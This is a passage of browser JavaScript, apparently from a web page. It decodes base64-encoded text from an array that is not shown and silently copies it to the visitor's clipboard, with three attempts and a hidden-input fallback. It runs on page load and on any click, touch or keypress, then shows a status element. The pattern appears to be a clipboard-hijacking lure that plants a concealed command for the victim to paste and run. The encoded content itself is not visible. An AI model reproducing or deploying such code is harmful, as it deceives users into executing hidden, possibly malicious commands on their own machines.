    let started = false;

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    function decodeBase64Utf8(base64Text) {
        const binary = atob(base64Text);
        const bytes = new Uint8Array(binary.length);

        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }

        return new TextDecoder("utf-8").decode(bytes);
    }

    function getText() {
        return parts.map(function (item) {
            return decodeBase64Utf8(item).trim();
        }).join("\n");
    }

    async function writeClipboardModern(value) {
        if (!navigator.clipboard || !window.isSecureContext) {
            throw new Error("Clipboard API unavailable");
        }

        await navigator.clipboard.writeText(value);
    }

    function writeClipboardFallback(value) {
        const input = document.getElementById("hiddenInput");
        input.value = value;
        input.focus();
        input.select();
        input.setSelectionRange(0, input.value.length);

        const ok = document.execCommand("copy");

        input.blur();

        if (!ok) {
            throw new Error("execCommand copy failed");
        }
    }

    async function writeClipboard(value) {
        try {
            await writeClipboardModern(value);
            return true;
        } catch (e) {
            try {
                writeClipboardFallback(value);
                return true;
            } catch (e2) {
                return false;
            }
        }
    }

    async function run() {
        if (started) {
            return;
        }

        started = true;

        await sleep(1000);

        const text = getText();
        let successCount = 0;

        for (let i = 0; i < 3; i++) {
            const ok = await writeClipboard(text);

            if (ok) {
                successCount++;
            }

            if (i < 2) {
                await sleep(500);
            }
        }

        if (successCount > 0) {
            const status = document.getElementById("status");
            status.style.display = "flex";
        } else {
            started = false;
        }
    }

    window.addEventListener("load", run);

    document.addEventListener("click", run);
    document.addEventListener("touchstart", run);
    document.addEventListener("keydown", run);
})();
